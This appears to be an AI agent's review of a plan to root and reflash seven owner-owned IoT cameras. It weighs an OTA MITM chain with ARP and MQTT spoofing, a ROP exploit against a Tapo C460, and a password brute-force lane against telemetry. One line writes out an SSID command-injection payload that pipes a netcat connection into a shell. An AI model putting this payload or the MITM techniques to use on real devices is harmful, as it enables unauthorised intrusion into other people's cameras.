# OMP Review — Camera Liberation Root-Shell Plan

**Reviewer:** omp agent, 2026-11-06 · **Method:** `modes-of-reasoning-project-analysis` skill, operators applied sequentially by a single agent (skill §Read Order permits this). Each mode is a bounded operator with one pivotal question; overreach and null results are stated. Every factual claim below cites repo evidence or live telemetry. **Telemetry ground truth:** `/var/lib/fss-telemetry/sweeper-c460.jsonl` (12,664 events) and `deliverables/fleet/CURRENT-WAITS.md`, both read 2026-11-06. Anything not measured is marked **[INFERENCE]**.

**Decision contract:** which of the 5 consensus items to execute, in what order, and what to cut, given 7 owner-owned cameras and scarce operator hands. Loss function: false readiness (executing a step whose prerequisites silently regressed) costs a wasted owner visit or a burned power cycle — the most expensive errors in this plan's history.

**Plan text under attack** (quoted from the author's context block):
> "Wyze .39/.51: OTA MITM chain armed, camera pulls OUR capsule, shadow delta versioning live (v1312), 22 accepted-rewrites — blocker is the camera's own OTA cadence + a power-cycle to reset backoff."
> "Tapo C460: ROP ret2stack armed, fires on PIR wake; boot-address window is statistical (579 wakes, 1 fire, no shell)."
> "Thingino target firmware extracted and verified (full ONVIF+RTSP post-flash, no vendor creds needed)."

Consensus items are from `DUELING_WIZARDS_REPORT.md` (§Consensus winners).

---

## 1. SYMBOLIC — deterministic vs judgment; certainty the plan doesn't have

**Pivotal question:** which steps can be scripted end-to-end with asserts, and where does the plan state as fact something no evidence path supports?

### Mechanical (assert-able today)

| Step | Existing asserts | Gap |
|---|---|---|
| Wyze preflight | `wyze_flash_preflight.sh`: MAC resolution, ARP+ICMP liveness, refuse-to-guess sensor gate | none — this is the model for the rest |
| Capsule/pin integrity | md5/sha256 published in `FLEET_LIBERATION_STATUS.md` §"staged now"; backup receivers WRQ-verified (`deliverables/scripts/tftp_serve.py`, ack sequence logged) | receiver must assert *byte counts per partition*, not just arrival |
| Write order | dry-run sandbox: 6 partitions, highest-first, uboot last, 13.5 MiB map refused (`FLEET_LIBERATION_STATUS.md` §23:4x) | dry-run was against a fake `/proc/mtd`; first real run is the first real run |
| AOSU entitlement diagnostic | `deliverables/scripts/aosu_cloud.py` login/devices/call smoke-tested; one `thing.m.device.key.get` call + JSON parse; assert = `local_key` present | none — most deterministic step in the plan |
| Owlet capture-coverage check | codex's switched-network critique (adopted in the duel report): `tcpdump` on en1 must show phone↔camera unicast before the app opens | **not yet written as a gate** — currently prose, not an assert |

### Judgment-bearing (cannot be fully scripted)

1. **Sensor-variant selection is a hidden manual gate inside the "one immutable transaction."** `docs/exploit/FLASH-DAY-RUNBOOK.md` §0.2: both units' sensor reads are "**PENDING — read post-root**", the variant is "NOT decidable host-side (`wyze_flash_preflight.sh` §9 warns and refuses to guess)", and a wrong pick "boots blind... it burns a power cycle." The plan quotes "Thingino target firmware extracted and verified" as if the flash were deterministic. Verified describes the *artifact* (sha-pinned, checker-passing). The *per-unit fit* is unproven and requires a root shell the flash is supposed to produce. The transaction's preflight must treat "sensor variant read" as a blocking stage with a visible assert, or the canary can consume the scarce power cycle on a blind-boot.
2. **The "visible-event" acceptance predicate is judgment, not code.** "A stale/frozen image must not satisfy the predicate" (duel report, finalist 5) — who writes "visible"? First-boot frames can be lens-covered, dark, or a static wall. Define it mechanically *before* flash day: ≥N consecutive frames with inter-frame pixel delta above threshold under a held-up test card, captured within T seconds of RTSP connect. Otherwise acceptance silently degrades to "a frame arrived."
3. **Yi is not "needs setup-mode" — it needs a GUI ritual with a metacharacter SSID.** `FLEET_LIBERATION_STATUS.md`: macOS Internet Sharing "cannot be brought up headlessly... `kickstart` is SIP-refused and the GUI toggle rewrites the SSID," and the payload SSID is `x$(nc 192.168.4.160 4444|sh)` — 28 octets of `$ ( |` that a GUI field must preserve verbatim. This is the most fragile operator step in the plan and the context block compresses it to three words.

### Certainty the plan doesn't have

**"OTA MITM chain armed... blocker is the camera's own OTA cadence + a power-cycle."** This is the plan's largest overclaim. The repo's own history says the compound chain has *never once been consumed end-to-end by a camera*:

- `CURRENT-WAITS.md` (open waits): "13:26: 6 GETs all from 160 (smoke tests); no camera-sourced fetch yet."
- `FLEET_LIBERATION_STATUS.md` §"02:10 — FOURTH chain defect": "All four must be fixed simultaneously for the OTA to complete; **any one alone would have produced 'nothing happens' with no error on either side**" — then a *fifth* (entrypoint beacon), then the dl-loc self-reference loop (359 requests, all self-referential). Five sequential defects, each invisible from both sides.
- §"03:05": `.51`'s real MQTT endpoint was `66.151.242.74:443` — "NOT to a24rq1e5m4mtei.iot.us-west-2.amazonaws.com:8883... Those SYNs currently get no SYN-ACK." The topology was incompletely mapped once already; the spoof list was extended reactively.

So "armed" means *every link individually verified*; it does not mean *the machine works*. The power cycle is not a cadence formality — it is **the first end-to-end experiment** on the plan's critical path. Framing it as "reset backoff" hides that its most likely outcomes include defect #6. Also: "22 accepted-rewrites" proves the camera PUBACKs our deltas (transport), not that `assis` *acts* on them — the §"Dispatch experiments that all failed" table is five entries of shadow-consumed-but-not-acted history. ACK ≠ act.

**"boot-address window is statistical."** Category error, and the telemetry is decisive:

- `boot_addr` is `'0xbef8b000'` in **585/585 probe events** — zero variance. The address is deterministic per boot, not a distribution.
- The plan's own arithmetic doesn't decompose into the telemetry schema: `present=623, fire=579, rop_result=574 (all "no-hang")`, plus one FORCE-gated fire-on-PRESENT (`CURRENT-WAITS.md`: "hit PRESENT 2026-11-05 23:31:42, one shot, no hang"). "579 wakes, 1 fire" matches neither field. Ground the counters before reasoning from them.
- What *is* random: (a) wake timing — already dense (see §2), (b) fire-vs-DS-stack-readiness alignment — seconds-scale, already polled at 1 Hz, and (c) **payload correctness — deterministic-unknown, not statistical**. `HANDOFF-CAMERA-LIBERATION.md` root-blocker chain: "Offset 1060 is UNVERIFIED — borrowed from the C660's binary. The C460's own `/bin/main` was never extracted." If the offset is wrong, 10,000 more wakes converge to nothing. A statistical window around a possibly-wrong offset is a convergence story the data cannot deliver.

---

## 2. NEURAL — what the 579-fire telemetry says that the plan ignores

**Pivotal question:** what pattern in 12,664 events changes the C460 approach?

Measured facts (from `sweeper-c460.jsonl`, 2026-11-06):

| Quantity | Value |
|---|---|
| Events total | 12,664 |
| `present` (wake) | 623 |
| `fire` | 579 |
| `rop_result` | 574 — **all `no-hang`, zero shells** |
| `login_attempt` | **10,286 (81.2% of all events)** |
| `boot_addr` | `0xbef8b000` — 585/585 probes, no variance |
| Inter-wake gap | median **2.8 min**, mean 8.2 min, p90 5.3 min |
| Fires by hour | every hour of the day; peak 03–05h (35/38/34) |

**P1 — The wakes are already saturated; the window is not the constraint.** A wake every ~2.8 minutes with fires at every hour means opportunity density is a solved problem; the burst daemon's 1 Hz poll covers any seconds-wide readiness window. The hourly peak at 03–05h (a time PIR motion is unlikely) suggests wakes are partly *background heartbeats*, not only human motion **[INFERENCE — schema doesn't tag wake cause]**. If true, the C460 needs no walk-past at all and never did. Consequence for consensus item 5: a next-wake-window predictor adds ~zero information on a camera that wakes every few minutes. The plan's "minimal scheduler" optimizes a variable the data says is already unconstrained.

**P2 — The 574 `no-hang` results are an unmined classifier corpus.** Every fire currently produces one bit (no-hang). But the repo owns a positive control: the oversized-password crash is "reproducible, empty reply" (`HANDOFF-CAMERA-LIBERATION.md`) — a *known* worker-crash signature. Instrument each fire with: DS-open latency after PIR, crash-recovery timing, and a port sweep — then stratify 579 fires by time-since-wake. If early-window fires show a different recovery signature than late-window ones, there is a readiness ramp and the within-wake timing matters. If all fires are signature-identical to the plain overflow, the ROP is landing at the wrong offset and **no amount of timing will ever help**. This converts 579 ambiguous negatives into a discriminating experiment — and it is a repo change, not a scheduler.

**P3 — 81% of telemetry is a closed-prior lane.** 10,286 `login_attempt` events feed a brute force the repo already closed: ~24.2 M candidates missed, rockyou exhausted in 7 s, verdict "the value is random or non-obvious" (`FLEET_LIBERATION_STATUS.md` §Tapo oracle). The sweeper is spending most of its life (and battery-cam DS calls) on a lane with no posterior mass. Kill or cap it; redeploy the poll budget to the instrumented fires of P2.

---

## 3. DEEP — second-order effects the plan misses

**Pivotal question:** what breaks *elsewhere* when one camera flashes?

**D1 — All seven cameras share one host, one NIC, one bettercap.** Every service in the handoff's launchd table (forge, broker, spoof, burst daemon, TFTP, receivers) runs on the en1 Mac. The flash transaction adds ~16 MiB image + 6 partition backups + capsule + beacon traffic to that host **while** the C460 burst daemon polls at 1 Hz with a seconds-scale fire window and the ARP spoof holds the *other* Wyze's traffic. en1's MAC is randomized per boot — a wireless-interface signature **[INFERENCE]**. If en1 is wireless, a backup-streaming burst plausibly degrades exactly the latency-sensitive C460 window and ARP freshness for the sibling camera **[INFERENCE]**. The plan models cameras as independent; they are coupled through one scheduler-starved host. Mitigation: check the C460 wake bands (§2 histogram) and schedule the flash transaction outside active-fire hours; or stream backups to disk-buffered receivers before the write stage.

**D2 — The boot-time resync race: broker liveness vs camera boot.** The value of the power cycle is that boot re-syncs the shadow — which means the camera's *first* MQTT CONNECT must land on our :8883 with accepted-rewrite armed. The broker is historically the least reliable component precisely then: 3,722 measured EADDRINUSE bind failures, PEM read races, the two-servisor cascade (`FLEET_LIBERATION_STATUS.md` §"2026-11-04 session"). And the §03:05 precedent shows a silent real-cloud fallback is possible when the spoof list misses a hostname. The transaction must assert, as hard pre-boots: (a) broker session live on :8883, (b) rewrite armed at current version, (c) bootwatch records *which broker* the camera connected to within N seconds of power-on. None of these three is in the plan text.

**D3 — The failure branch has no owner.** "One immutable transaction" plans the success path. If the canary write fails mid-way and the camera recovers to stock, it rejoins with an older version; the shadow desired state may have been consumed or the keepfresh refresher (§"must be stopped before publishing the capsule") may still be stopped. The recovery branch needs: re-arm keepfresh, re-publish negative, re-verify armed state — written down before flash day, not improvised after a failure.

**D4 — The bundled owner session couples its own failure modes.** One visit now carries: Owlet H1 capture (passive), Wyze power-cycle (MITM-dependent), Yi re-provision (**mutates macOS network config** — the Internet Sharing toggle that "rewrites the SSID" and once SIP-refused headless control), C660 adjacency. A network-config churn event mid-visit degrades *all* gates simultaneously. Order the visit: passive captures → MITM-dependent steps → config-mutating AP toggle **last**, with a fabric-health assert between stages. Also honor the repo's own invariant: "One camera per agent; TUTK refuses concurrent sessions" (`FLEET_LIBERATION_STATUS.md` §Safety invariants) — Owlet, Yi, and Wyze are all TUTK-family; serialize their interaction windows.

**D5 — Post-flash identity.** Liveness authority is `arp -an`, never ping (Eero proxy-answers ICMP for asleep devices). Post-flash, thingino rejoins and DHCP may move it; acceptance must assert identity by MAC (`deliverables/fleet/dhcp-reservations.md` exists; preflight already resolves by MAC) before the RTSP acceptance predicate runs. A stale-IP acceptance would validate the wrong device.

---

## 4. FAST — the single cheapest uncertainty-killer

**The 5-second power cycle of .51 (or .39), today, decoupled from the bundled owner session**, with the D2 asserts armed.

Reasoning: the plan's largest untested load-bearing assumption is "the armed Wyze chain completes when a camera actually fetches." Every other lane owns at least one consumption-proof (Tapo: reproducible crash; C660: port-open + tftp path verified; Owlet: DTLS completes; AOSU signer: golden vectors). Wyze owns zero camera-sourced end-to-end consumption. The power cycle converts "armed" into either *consumed* (chain proven → flash transaction starts, RTSP-creds blocker dissolves per duel §B1) or *defect #6 found* — both outcomes kill more uncertainty than anything else available at any price. It is a wired camera and a plug; operator cost ≈ 5 seconds; the plan currently *defers* this to the bundled session for bundling neatness while the critical path waits.

Parallel free action (agent-side, zero operator): run the **AOSU entitlement diagnostic** in the same hour — scripted, smoke-tested, decides the 5-device lane (H2E + 4 SolarCams). If forced to exactly one action: the power cycle, because the AOSU diagnostic cannot unblock the plan's most-progressed cameras.

---

## 5. VERDICT — rank the 5 consensus items; cut list

Score = certainty of success × cameras unlocked ÷ operator time. Certainties are my judgments from the evidence above, stated so you can disagree with the number rather than the vibe.

| Rank | Item | Certainty | Cameras | Op time | Ratio | Verdict |
|---|---|---|---|---|---|---|
| 1 | **AOSU entitlement diagnostic before signer work** | 0.95 (mechanical, client smoke-tested) | 5 (H2E fronts 4 SolarCams) | ~0 | **highest** | GO now, agent-side |
| 2 | **Prepared owner session** | 0.80 (after capture-coverage pre-check + D4 ordering) | 4–5 | 30–60 min | high | GO, with ordering asserts |
| 3 | **Wyze canary flash transaction** | 0.75 (mechanics dry-run-proven; sensor variant PENDING; chain never consumed) | 2 (+dissolves RTSP blocker) | 1–2 h watch | high | GO — gated on the power-cycle experiment firing first |
| 4 | **First-footage auto-acceptance** | 0.60 (predicate undefined; downstream of #3) | all post-flash | low | medium | GO — write the mechanical predicate before flash day |
| 5 | **Minimal wake-window scheduler** | 0.25 (windows already saturated — §2 P1) | 1 (C460; C660 has no telemetry) | dev hours | **lowest** | **CUT** |

**CUT item 5.** The telemetry replay it proposed ("replay the existing 12.6k c460 events to predict the next wake window" — duel report, Recommended next steps #5) was performed for this review, and the answer is: windows are dense and uniform; scheduling adds nothing. Replace it with the P2 instrumented-fire classification — the experiment the data actually motivates. This is not killing the idea behind item 5 (telemetry-driven timing); it is noting that its premise died on contact with the data.

**Rejected tempting claims** (checked and dropped during this review, per skill discipline):
- "Flash-day reboots break the pinned host routes" — false; routes live on the Mac, which is not rebooted.
- "ARP spoof *definitely* degrades during flash" — kept only as D1 **[INFERENCE]**; en1's medium is unverified.
- "579 wakes = 579 PIR motions" — ungrounded; the 03–05h fire peak argues otherwise.
- "accepted-rewrites prove dispatch" — the §"Dispatch experiments that all failed" table is the counter-evidence.

**What would change this review:** boot_addr variance in future probes (kills P1's framing); a camera-sourced capsule GET in the forge logs (weakens the symbolic attack on "armed" to historical); en1 confirmed wired (weakens D1); a sensor-variant read for either unit (raises #3's certainty to ~0.9).
